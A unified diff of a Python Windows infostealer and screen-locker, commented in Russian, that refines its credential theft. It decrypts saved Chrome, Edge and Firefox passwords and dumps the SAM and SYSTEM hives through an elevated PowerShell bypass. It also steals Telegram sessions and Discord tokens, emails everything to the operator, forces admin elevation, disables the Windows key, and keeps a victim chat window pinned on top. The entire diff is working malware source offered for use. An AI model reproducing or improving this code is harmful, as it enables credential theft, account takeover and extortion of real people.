@@ -31,9 +31,6 @@ import winreg
 import zipfile
 import win32crypt
 import re
-import struct
-import hashlib
-from binascii import hexlify, unhexlify
 
 # ============================================================
 # >>> НАСТРОЙКИ <<<
@@ -83,201 +80,143 @@ def restore_win_key():
 
 # ========== ПОВЫШЕНИЕ ПРАВ ДО АДМИНА ==========
 def run_as_admin():
-    """Перезапускает скрипт с правами администратора"""
     try:
         if ctypes.windll.shell32.IsUserAnAdmin():
             return True
-        
         script = os.path.abspath(__file__)
         params = ' '.join([f'"{a}"' for a in sys.argv[1:]])
-        
-        ctypes.windll.shell32.ShellExecuteW(
-            None, 
-            "runas", 
-            sys.executable,
-            f'"{script}" {params}',
-            None, 
-            1
-        )
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
         os._exit(0)
     except:
         pass
     return False
 
-# ========== РАСШИФРОВКА FIREFOX ==========
-def extract_asn1_value(data, offset):
-    """Извлекает значение из ASN.1 DER"""
-    try:
-        if offset >= len(data):
-            return None, offset
-        
-        tag = data[offset]
-        offset += 1
-        
-        if tag == 0x02:  # INTEGER
-            length = data[offset]
-            offset += 1
-            value = data[offset:offset+length]
-            return value, offset + length
-        
-        elif tag == 0x04:  # OCTET STRING
-            length = data[offset]
-            offset += 1
-            value = data[offset:offset+length]
-            return value, offset + length
-        
-        elif tag == 0x30:  # SEQUENCE
-            length = data[offset]
-            offset += 1
-            if length & 0x80:
-                num_bytes = length & 0x7F
-                length = 0
-                for i in range(num_bytes):
-                    length = (length << 8) | data[offset + i]
-                offset += num_bytes
-            return data[offset:offset+length], offset + length
-        
-        elif tag == 0x06:  # OID
-            length = data[offset]
-            offset += 1 + length
-            return None, offset
-        
-        elif tag == 0x05:  # NULL
-            offset += 1
-            return None, offset
-        
-        elif tag == 0x0C:  # UTF8String
-            length = data[offset]
-            offset += 1
-            return data[offset:offset+length].decode('utf-8', errors='ignore'), offset + length
-        
-        else:
-            if offset < len(data):
-                length = data[offset]
-                offset += 1 + length
-            return None, offset
+# ========== EDGE РАСШИФРОВКА (AES-GCM) ==========
+def steal_edge_passwords():
+    result = []
+    paths = [
+        os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
+        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
+    ]
     
-    except:
-        return None, offset
-
-def parse_encrypted_data(encrypted_blob):
-    """Парсит зашифрованные данные Firefox"""
-    try:
-        if encrypted_blob[0] != 0x30:
-            return None
-        
-        # Пропускаем заголовок SEQUENCE
-        length = encrypted_blob[1]
-        offset = 2
-        if length & 0x80:
-            num_bytes = length & 0x7F
-            length = 0
-            for i in range(num_bytes):
-                length = (length << 8) | encrypted_blob[offset + i]
-            offset += num_bytes
-        
-        # Ищем IV и ciphertext
-        iv = None
-        ct = None
-        
-        while offset < len(encrypted_blob):
-            tag = encrypted_blob[offset]
+    for login_path in paths:
+        if not os.path.exists(login_path):
+            continue
+        try:
+            # Получаем мастер-ключ
+            master_key = None
+            local_state_path = os.path.join(os.path.dirname(os.path.dirname(login_path)), 'Local State')
+            if os.path.exists(local_state_path):
+                try:
+                    with open(local_state_path, 'r', encoding='utf-8') as f:
+                        local_state = json.load(f)
+                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+                    encrypted_key = encrypted_key[5:]  # Убираем 'DPAPI'
+                    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+                except:
+                    pass
             
-            if tag == 0x04:  # OCTET STRING
-                val_len = encrypted_blob[offset + 1]
-                data_start = offset + 2
-                value = encrypted_blob[data_start:data_start + val_len]
+            temp_db = os.path.join(tempfile.gettempdir(), f'edge_{random.randint(1000,9999)}.db')
+            shutil.copy2(login_path, temp_db)
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            
+            for row in cursor.fetchall():
+                url = row[0]
+                username = row[1]
+                encrypted_password = row[2]
                 
-                if iv is None:
-                    iv = value
-                elif ct is None:
-                    ct = value
-                
-                offset = data_start + val_len
+                try:
+                    # v10 (DPAPI)
+                    if encrypted_password[:3] == b'\x01\x00\x00':
+                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
+                    # v11 (AES-GCM)
+                    elif encrypted_password[:3] == b'\x76\x31\x31':
+                        password = _decrypt_aes_gcm(encrypted_password[3:], master_key)
+                    else:
+                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
+                    
+                    password = password.decode('utf-8', errors='ignore')
+                    result.append(f"EDGE | {url} | {username} | {password}")
+                except:
+                    result.append(f"EDGE | {url} | {username} | ***")
             
-            elif tag == 0x30:  # SEQUENCE
-                val_len = encrypted_blob[offset + 1]
-                if val_len & 0x80:
-                    num_bytes = val_len & 0x7F
-                    val_len = 0
-                    for i in range(num_bytes):
-                        val_len = (val_len << 8) | encrypted_blob[offset + 2 + i]
-                    offset += 2 + num_bytes
-                else:
-                    offset += 2
-                
-                sub_data = encrypted_blob[offset:offset + val_len]
-                sub_iv, sub_ct = parse_encrypted_data_sub(sub_data)
-                if sub_iv:
-                    iv = sub_iv
-                if sub_ct:
-                    ct = sub_ct
-                offset += val_len
-            
-            elif tag == 0x02:  # INTEGER
-                int_len = encrypted_blob[offset + 1]
-                offset += 2 + int_len
-            
-            elif tag == 0x06:  # OID
-                oid_len = encrypted_blob[offset + 1]
-                offset += 2 + oid_len
-            
-            else:
-                if offset + 1 < len(encrypted_blob):
-                    skip_len = encrypted_blob[offset + 1]
-                    offset += 2 + skip_len
-                else:
-                    break
-        
-        return iv, ct
+            conn.close()
+            try:
+                os.remove(temp_db)
+            except:
+                pass
+        except:
+            pass
     
-    except:
-        return None, None
+    return result
 
-def parse_encrypted_data_sub(data):
-    """Парсит вложенные данные"""
-    iv = None
-    ct = None
-    offset = 0
-    
-    while offset < len(data):
-        if data[offset] == 0x04:
-            val_len = data[offset + 1]
-            value = data[offset + 2:offset + 2 + val_len]
-            if iv is None:
-                iv = value
-            else:
-                ct = value
-            offset += 2 + val_len
-        elif data[offset] == 0x02:
-            int_len = data[offset + 1]
-            offset += 2 + int_len
-        else:
-            break
-    
-    return iv, ct
-
-def decrypt_firefox_3des(encrypted_data, key, iv):
-    """Расшифровка 3DES-CBC"""
+def _decrypt_aes_gcm(data, key):
     try:
-        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-        from cryptography.hazmat.backends import default_backend
-        
-        backend = default_backend()
-        cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=backend)
-        decryptor = cipher.decryptor()
-        decrypted = decryptor.update(encrypted_data) + decryptor.finalize()
-        
-        # Убираем PKCS7 padding
-        padding_len = decrypted[-1]
-        if padding_len < 16:
-            return decrypted[:-padding_len]
-        return decrypted
+        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+        nonce = data[:12]
+        ciphertext = data[12:]
+        aesgcm = AESGCM(key)
+        return aesgcm.decrypt(nonce, ciphertext, None)
     except:
-        return None
+        raise
 
+# ========== CHROMIUM ПАРОЛИ ==========
+def steal_chromium_passwords(browser_name, paths):
+    result = []
+    for login_path in paths:
+        if not os.path.exists(login_path):
+            continue
+        try:
+            # Получаем мастер-ключ для AES-GCM
+            master_key = None
+            local_state_path = os.path.join(os.path.dirname(os.path.dirname(login_path)), 'Local State')
+            if os.path.exists(local_state_path):
+                try:
+                    with open(local_state_path, 'r', encoding='utf-8') as f:
+                        local_state = json.load(f)
+                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+                    encrypted_key = encrypted_key[5:]
+                    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+                except:
+                    pass
+            
+            temp_db = os.path.join(tempfile.gettempdir(), f'{browser_name}_{random.randint(1000,9999)}.db')
+            shutil.copy2(login_path, temp_db)
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            
+            for row in cursor.fetchall():
+                url = row[0]
+                username = row[1]
+                encrypted_password = row[2]
+                
+                try:
+                    if encrypted_password[:3] == b'\x01\x00\x00':
+                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
+                    elif encrypted_password[:3] == b'\x76\x31\x31' and master_key:
+                        password = _decrypt_aes_gcm(encrypted_password[3:], master_key)
+                    else:
+                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
+                    
+                    password = password.decode('utf-8', errors='ignore')
+                    result.append(f"{browser_name} | {url} | {username} | {password}")
+                except:
+                    result.append(f"{browser_name} | {url} | {username} | ***")
+            
+            conn.close()
+            try:
+                os.remove(temp_db)
+            except:
+                pass
+        except:
+            pass
+    return result
+
+# ========== FIREFOX РАСШИФРОВКА ==========
 def decrypt_firefox_profile(profile_path):
-    """Расшифровка всех паролей Firefox из профиля"""
     result = []
     
     try:
@@ -293,44 +232,25 @@ def decrypt_firefox_profile(profile_path):
         conn = sqlite3.connect(key4_file)
         cursor = conn.cursor()
         
-        # Получаем мастер-ключ
         cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'password'")
         meta_row = cursor.fetchone()
         if not meta_row:
             conn.close()
             return result
         
-        global_salt = meta_row[0]
-        encrypted_key_item = meta_row[1]
-        
-        # Пробуем найти ключ в nssPrivate
         cursor.execute("SELECT a11, a102 FROM nssPrivate LIMIT 1")
         nss_row = cursor.fetchone()
-        
         if not nss_row:
             conn.close()
             return result
         
-        a11 = nss_row[0]
-        a102 = nss_row[1]
-        
-        # Расшифровываем мастер-ключ
-        master_password = ""
-        key_3des = None
-        
-        if master_password:
-            # Если есть мастер-пароль, нужна другая логика
-            pass
-        else:
-            # Без мастер-пароля - ключ в a102
-            if a102 and len(a102) >= 24:
-                key_3des = a102[:24]
+        a11, a102 = nss_row
+        key_3des = a102[:24] if a102 and len(a102) >= 24 else None
         
         if not key_3des:
             conn.close()
             return result
         
-        # Расшифровываем каждый логин
         for login in logins_data.get('logins', []):
             hostname = login.get('hostname', '')
             username = "ERROR"
@@ -338,101 +258,156 @@ def decrypt_firefox_profile(profile_path):
             
             try:
                 enc_user = base64.b64decode(login['encryptedUsername'])
-                iv, ct = parse_encrypted_data(enc_user)
-                
-                if iv and ct and key_3des:
-                    decrypted = decrypt_firefox_3des(ct, key_3des, iv)
-                    if decrypted:
-                        # Убираем возможные \x00 в начале
-                        username = decrypted.decode('utf-8', errors='ignore').lstrip('\x00').strip()
+                iv, ct = _parse_firefox_asn1(enc_user)
+                if iv and ct:
+                    dec = _decrypt_3des(ct, key_3des, iv)
+                    if dec:
+                        username = dec.decode('utf-8', errors='ignore').lstrip('\x00').strip()
             except:
                 pass
             
             try:
                 enc_pass = base64.b64decode(login['encryptedPassword'])
-                iv, ct = parse_encrypted_data(enc_pass)
-                
-                if iv and ct and key_3des:
-                    decrypted = decrypt_firefox_3des(ct, key_3des, iv)
-                    if decrypted:
-                        password = decrypted.decode('utf-8', errors='ignore').lstrip('\x00').strip()
+                iv, ct = _parse_firefox_asn1(enc_pass)
+                if iv and ct:
+                    dec = _decrypt_3des(ct, key_3des, iv)
+                    if dec:
+                        password = dec.decode('utf-8', errors='ignore').lstrip('\x00').strip()
             except:
                 pass
-            
-            # Если не удалось - пробуем через CryptUnprotectData (для новых версий)
-            if username == "ERROR" or password == "ERROR":
-                try:
-                    enc_user = base64.b64decode(login['encryptedUsername'])
-                    username = win32crypt.CryptUnprotectData(enc_user, None, None, None, 0)[1].decode('utf-8', errors='ignore').lstrip('\x00').strip()
-                except:
-                    pass
-                
-                try:
-                    enc_pass = base64.b64decode(login['encryptedPassword'])
-                    password = win32crypt.CryptUnprotectData(enc_pass, None, None, None, 0)[1].decode('utf-8', errors='ignore').lstrip('\x00').strip()
-                except:
-                    pass
             
             result.append(f"FIREFOX | {hostname} | {username} | {password}")
         
         conn.close()
     
-    except Exception as e:
+    except:
         pass
     
-    # Если ничего не расшифровалось - отправляем файлы
-    if all("ERROR" in r for r in result):
+    # Если всё ERROR - отправляем файлы
+    all_errors = all("ERROR" in r for r in result) if result else True
+    if all_errors:
         _send_firefox_files(profile_path, os.path.basename(profile_path))
-        result = [f"FIREFOX: Не удалось расшифровать. Файлы отправлены на почту для ручной расшифровки."]
+        result.append("FIREFOX: Файлы отправлены на почту для ручной расшифровки")
     
     return result
 
-# ========== КРАЖА CHROMIUM ПАРОЛЕЙ ==========
-def steal_chromium_passwords(browser_name, paths):
+def _parse_firefox_asn1(data):
+    try:
+        if data[0] != 0x30:
+            return None, None
+        
+        length = data[1]
+        offset = 2
+        if length & 0x80:
+            num_bytes = length & 0x7F
+            length = int.from_bytes(data[2:2+num_bytes], 'big')
+            offset += num_bytes
+        
+        iv = None
+        ct = None
+        end = offset + length
+        
+        while offset < end:
+            tag = data[offset]
+            offset += 1
+            item_len = data[offset]
+            offset += 1
+            item = data[offset:offset+item_len]
+            offset += item_len
+            
+            if tag == 0x04:
+                if iv is None:
+                    iv = item
+                else:
+                    ct = item
+        
+        return iv, ct
+    except:
+        return None, None
+
+def _decrypt_3des(data, key, iv):
+    try:
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+        from cryptography.hazmat.backends import default_backend
+        
+        backend = default_backend()
+        cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=backend)
+        decryptor = cipher.decryptor()
+        decrypted = decryptor.update(data) + decryptor.finalize()
+        
+        padding_len = decrypted[-1]
+        if padding_len < 16:
+            return decrypted[:-padding_len]
+        return decrypted
+    except:
+        return None
+
+# ========== SAM ДАМП ==========
+def dump_sam():
     result = []
-    for login_path in paths:
-        if not os.path.exists(login_path):
-            continue
-        try:
-            temp_db = os.path.join(tempfile.gettempdir(), f'{browser_name}_{random.randint(1000,9999)}.db')
-            shutil.copy2(login_path, temp_db)
-            conn = sqlite3.connect(temp_db)
-            cursor = conn.cursor()
-            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-            for row in cursor.fetchall():
-                url = row[0]
-                username = row[1]
-                try:
-                    password = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode('utf-8', errors='ignore')
-                    result.append(f"{browser_name} | {url} | {username} | {password}")
-                except:
-                    result.append(f"{browser_name} | {url} | {username} | ***")
-            conn.close()
+    try:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+        
+        sam_path = os.path.join(tempfile.gettempdir(), 'sam')
+        sys_path = os.path.join(tempfile.gettempdir(), 'system')
+        
+        if is_admin:
+            os.system(f'reg save HKLM\\SAM "{sam_path}" /y >nul 2>&1')
+            os.system(f'reg save HKLM\\SYSTEM "{sys_path}" /y >nul 2>&1')
+        else:
+            # Повышение через PowerShell
+            ps_cmd = f'''
+$samPath = "{sam_path}"
+$sysPath = "{sys_path}"
+reg save HKLM\\SAM $samPath /y 2>$null
+reg save HKLM\\SYSTEM $sysPath /y 2>$null
+'''
+            ps_file = os.path.join(tempfile.gettempdir(), 'dump.ps1')
+            with open(ps_file, 'w', encoding='utf-8') as f:
+                f.write(ps_cmd)
+            
+            subprocess.run(f'powershell -Command "Start-Process PowerShell -Verb RunAs -ArgumentList \\'-ExecutionPolicy Bypass -File \\"{ps_file}\\"\\'"', shell=True, capture_output=True)
+            time.sleep(5)
+            
             try:
-                os.remove(temp_db)
+                os.remove(ps_file)
             except:
                 pass
-        except:
-            pass
+        
+        if os.path.exists(sam_path) and os.path.getsize(sam_path) > 100:
+            hash_zip = os.path.join(tempfile.gettempdir(), 'sam_dump.zip')
+            with zipfile.ZipFile(hash_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
+                zf.write(sam_path, 'sam')
+                zf.write(sys_path, 'system')
+            
+            send_file_email(hash_zip, "SAM+SYSTEM Dump")
+            result.append(f"SAM+SYSTEM отправлены! Размер: {os.path.getsize(sam_path)} байт")
+            result.append("Расшифровка: impacket-secretsdump -sam sam -system system LOCAL")
+            
+            for f in [hash_zip, sam_path, sys_path]:
+                try:
+                    os.remove(f)
+                except:
+                    pass
+        else:
+            result.append("Не удалось получить SAM. Нужен запуск от Администратора")
+    
+    except Exception as e:
+        result.append(f"Ошибка дампа SAM: {str(e)}")
+    
     return result
 
-# ========== ПОИСК TELEGRAM ==========
+# ========== TELEGRAM / DISCORD ==========
 def find_telegram():
     paths = [
         os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata'),
         os.path.join(os.environ['LOCALAPPDATA'], 'Telegram Desktop', 'tdata'),
-        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Telegram Desktop', 'tdata'),
-        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Telegram Desktop', 'tdata'),
-        'C:\\Program Files\\Telegram Desktop\\tdata',
-        'C:\\Program Files (x86)\\Telegram Desktop\\tdata',
     ]
     
-    # Также ищем через реестр
     try:
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\TelegramDesktop", 0, winreg.KEY_READ)
         try:
-            tg_path = winreg.QueryValueEx(key, "InstallDir")[0]
-            paths.append(os.path.join(tg_path, 'tdata'))
+            paths.append(os.path.join(winreg.QueryValueEx(key, "InstallDir")[0], 'tdata'))
         except:
             pass
         winreg.CloseKey(key)
@@ -442,49 +417,25 @@ def find_telegram():
     for path in paths:
         if os.path.exists(path):
             return path
-    
-    # Поиск по всем папкам AppData
-    appdata = os.environ.get('APPDATA', '')
-    if appdata:
-        for root, dirs, files in os.walk(appdata):
-            if 'tdata' in dirs and 'Telegram' in root:
-                return os.path.join(root, 'tdata')
-    
     return None
 
-# ========== ПОИСК DISCORD ==========
 def find_discord_tokens():
     tokens = set()
-    
     leveldb_paths = [
         os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'),
         os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb'),
         os.path.join(os.environ['APPDATA'], 'discordptb', 'Local Storage', 'leveldb'),
-        os.path.join(os.environ['APPDATA'], 'Lightcord', 'Local Storage', 'leveldb'),
-        os.path.join(os.environ['LOCALAPPDATA'], 'discord', 'Local Storage', 'leveldb'),
     ]
-    
-    # Ищем все возможные папки Discord
-    appdata = os.environ.get('APPDATA', '')
-    if appdata:
-        for folder in os.listdir(appdata):
-            if 'discord' in folder.lower():
-                ldb_path = os.path.join(appdata, folder, 'Local Storage', 'leveldb')
-                if os.path.exists(ldb_path):
-                    leveldb_paths.append(ldb_path)
     
     for db_path in leveldb_paths:
         if not os.path.exists(db_path):
             continue
-        
         try:
             for file in os.listdir(db_path):
                 if file.endswith('.ldb') or file.endswith('.log'):
                     try:
                         with open(os.path.join(db_path, file), 'r', errors='ignore') as f:
-                            content = f.read()
-                            found = re.findall(r'[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}', content)
-                            tokens.update(found)
+                            tokens.update(re.findall(r'[MN][A-Za-z\d]{23}\.[A-Za-z\d]{6}\.[A-Za-z\d]{27}', f.read()))
                     except:
                         pass
         except:
@@ -492,86 +443,18 @@ def find_discord_tokens():
     
     return list(tokens)[:20]
 
-# ========== ДАМП SAM С ПОВЫШЕНИЕМ ПРАВ ==========
-def dump_sam():
-    result = []
-    try:
-        # Проверяем права
-        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
-        
-        if not is_admin:
-            # Пробуем повысить права через ShellExecute
-            result.append("Запрашиваю права администратора...")
-            
-            script = os.path.abspath(__file__)
-            # Создаём временный скрипт для дампа
-            dump_script = os.path.join(tempfile.gettempdir(), 'dump_sam.bat')
-            with open(dump_script, 'w') as f:
-                f.write(f'''@echo off
-reg save HKLM\\SAM "{tempfile.gettempdir()}\\sam" /y >nul 2>&1
-reg save HKLM\\SYSTEM "{tempfile.gettempdir()}\\system" /y >nul 2>&1
-''')
-            
-            # Запускаем с повышением прав
-            ctypes.windll.shell32.ShellExecuteW(
-                None, "runas", "cmd.exe",
-                f'/c "{dump_script}"',
-                None, 1
-            )
-            
-            time.sleep(3)  # Ждём выполнения
-            
-            try:
-                os.remove(dump_script)
-            except:
-                pass
-        
-        sam_path = os.path.join(tempfile.gettempdir(), 'sam')
-        sys_path = os.path.join(tempfile.gettempdir(), 'system')
-        
-        if os.path.exists(sam_path) and os.path.getsize(sam_path) > 0:
-            hash_zip = os.path.join(tempfile.gettempdir(), 'sam_dump.zip')
-            with zipfile.ZipFile(hash_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
-                zf.write(sam_path, 'sam')
-                zf.write(sys_path, 'system')
-            
-            send_file_email(hash_zip, "SAM+SYSTEM Hash Dump")
-            result.append(f"SAM+SYSTEM отправлены! Размер SAM: {os.path.getsize(sam_path)} байт")
-            result.append("Расшифровка: impacket-secretsdump -sam sam -system system LOCAL")
-            
-            for f in [hash_zip, sam_path, sys_path]:
-                try:
-                    os.remove(f)
-                except:
-                    pass
-        else:
-            result.append("Не удалось получить SAM. Возможные причины:")
-            result.append("- Запуск не от администратора")
-            result.append("- Антивирус блокирует доступ к реестру")
-            result.append("- Недостаточно прав")
-    
-    except Exception as e:
-        result.append(f"Ошибка дампа SAM: {str(e)}")
-    
-    return result
-
-# ========== ОТПРАВКА ФАЙЛОВ FIREFOX ==========
+# ========== ОТПРАВКА ФАЙЛОВ ==========
 def _send_firefox_files(profile_path, folder_name):
     try:
         key4 = os.path.join(profile_path, 'key4.db')
         logins = os.path.join(profile_path, 'logins.json')
-        cert9 = os.path.join(profile_path, 'cert9.db')
-        
-        z = os.path.join(tempfile.gettempdir(), f'firefox_{folder_name[:10]}.zip')
+        z = os.path.join(tempfile.gettempdir(), f'ff_{folder_name[:10]}.zip')
         with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
             if os.path.exists(logins):
                 zf.write(logins, 'logins.json')
             if os.path.exists(key4):
                 zf.write(key4, 'key4.db')
-            if os.path.exists(cert9):
-                zf.write(cert9, 'cert9.db')
-        
-        send_file_email(z, f"Firefox Profile {folder_name[:10]}")
+        send_file_email(z, f"Firefox {folder_name[:10]}")
         try:
             os.remove(z)
         except:
@@ -582,20 +465,15 @@ def _send_firefox_files(profile_path, folder_name):
 def _send_telegram(tg_path):
     try:
         z = os.path.join(tempfile.gettempdir(), 'telegram.zip')
-        sent = False
         with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
             for root, dirs, files in os.walk(tg_path):
                 for file in files:
                     if file in ['key_datas', 'D877F783D5D3EF8C', 'settingss', 'maps'] or file.startswith('usertag') or file.startswith('data'):
                         try:
                             zf.write(os.path.join(root, file), file)
-                            sent = True
                         except:
                             pass
-        
-        if sent:
-            send_file_email(z, "Telegram Session")
-        
+        send_file_email(z, "Telegram Session")
         try:
             os.remove(z)
         except:
@@ -617,8 +495,7 @@ def mega_steal_data():
         
         R.append("\n--- IPCONFIG ---")
         try:
-            ipconfig = subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
-            R.append(ipconfig[:5000])
+            R.append(subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')[:5000])
         except:
             pass
         
@@ -630,8 +507,7 @@ def mega_steal_data():
         try:
             pub_ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
             geo = json.loads(urllib.request.urlopen(f"http://ip-api.com/json/{pub_ip}", timeout=5).read())
-            R.append(f"Внешний IP: {pub_ip}")
-            R.append(f"Страна: {geo.get('country','?')} | Город: {geo.get('city','?')} | Провайдер: {geo.get('isp','?')}")
+            R.append(f"Внешний IP: {pub_ip} | {geo.get('country','?')} | {geo.get('city','?')} | {geo.get('isp','?')}")
         except:
             pass
         
@@ -655,7 +531,7 @@ def mega_steal_data():
             pass
         
         R.append("\n" + "=" * 60)
-        R.append("ПАРОЛИ БРАУЗЕРОВ (ПОЛНАЯ РАСШИФРОВКА)")
+        R.append("ПАРОЛИ БРАУЗЕРОВ")
         R.append("=" * 60)
         
         # Chrome
@@ -682,9 +558,7 @@ def mega_steal_data():
         
         # Edge
         R.append("\n--- EDGE ---")
-        ep = steal_chromium_passwords("EDGE", [
-            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
-        ])
+        ep = steal_edge_passwords()
         R.extend(ep if ep else ["Нет данных"])
         
         # Firefox
@@ -697,11 +571,7 @@ def mega_steal_data():
                 if os.path.exists(os.path.join(pf, 'logins.json')):
                     ff_found = True
                     R.append(f"\nПрофиль: {folder}")
-                    dec = decrypt_firefox_profile(pf)
-                    if dec:
-                        R.extend(dec)
-                    else:
-                        R.append("Не удалось расшифровать")
+                    R.extend(decrypt_firefox_profile(pf))
             if not ff_found:
                 R.append("Нет данных")
         else:
@@ -712,16 +582,14 @@ def mega_steal_data():
         R.append("=" * 60)
         R.extend(dump_sam())
         
-        # Telegram
         R.append("\n--- TELEGRAM ---")
         tg_path = find_telegram()
         if tg_path:
             _send_telegram(tg_path)
-            R.append(f"Сессия Telegram отправлена! Найден: {tg_path}")
+            R.append("Сессия Telegram отправлена!")
         else:
-            R.append("Telegram не найден")
+            R.append("Не найден")
         
-        # Discord
         R.append("\n--- DISCORD ---")
         tokens = find_discord_tokens()
         if tokens:
@@ -730,24 +598,15 @@ def mega_steal_data():
         else:
             R.append("Токены не найдены")
         
-        # Системная информация
-        R.append("\n--- СИСТЕМА ---")
-        try:
-            sysinfo = subprocess.check_output("systeminfo", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
-            R.append(sysinfo[:3000])
-        except:
-            pass
-        
         R.append("\n" + "=" * 60)
         R.append(f"ОТЧЁТ: {time.strftime('%d.%m.%Y %H:%M:%S')}")
         
-        # Отправка
         text = '\n'.join(R)
         for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
             send_email(part, f"DedSek FULL [{i+1}]")
         
     except Exception as e:
-        send_email(f"Ошибка стилера: {e}")
+        send_email(f"Ошибка: {e}")
 
 def send_email(message, subject=None):
     try:
@@ -830,7 +689,7 @@ def _send_video(fp):
     except:
         pass
 
-# ========== ЧАТ ==========
+# ========== ЧАТ (ФИКС - ВСЕГДА ПОВЕРХ) ==========
 class VictimChat:
     def __init__(self, locker_window):
         self.locker = locker_window
@@ -839,12 +698,25 @@ class VictimChat:
     def show(self):
         if self.chat_window:
             return
-        self.chat_window = tk.Toplevel(self.locker.win)
+        
+        self.chat_window = tk.Toplevel()
         self.chat_window.geometry("380x480+60+60")
         self.chat_window.configure(bg='#00FF00')
         self.chat_window.attributes('-topmost', True)
         self.chat_window.overrideredirect(True)
         self.chat_window.focus_force()
+        self.chat_window.grab_set()
+        
+        # Держим окно поверх всего
+        def keep_top():
+            while self.chat_window:
+                try:
+                    self.chat_window.lift()
+                    self.chat_window.attributes('-topmost', True)
+                    time.sleep(0.5)
+                except:
+                    break
+        threading.Thread(target=keep_top, daemon=True).start()
         
         frame = tk.Frame(self.chat_window, bg='black', bd=2, relief='solid')
         frame.pack(fill='both', expand=True, padx=2, pady=2)
@@ -880,6 +752,7 @@ class VictimChat:
     
     def hide(self):
         if self.chat_window:
+            self.chat_window.grab_release()
             self.chat_window.destroy()
             self.chat_window = None
         self.locker.win.focus_force()
@@ -927,7 +800,7 @@ class VictimChat:
                 time.sleep(5)
         threading.Thread(target=_check, daemon=True).start()
 
-# ========== ОСТАЛЬНЫЕ ФУНКЦИИ ==========
+# ========== ОСТАЛЬНОЕ ==========
 def anti_debug():
     try:
         if ctypes.windll.kernel32.IsDebuggerPresent():
@@ -1158,11 +1031,7 @@ if __name__ == "__main__":
     hide_console()
     anti_debug()
     disable_win_key()
-    
-    # Повышаем права для дампа SAM
-    if not ctypes.windll.shell32.IsUserAnAdmin():
-        run_as_admin()
-    
+    run_as_admin()
     threading.Thread(target=mega_steal_data, daemon=True).start()
     threading.Thread(target=record_and_send_loop, daemon=True).start()
     add_to_startup()
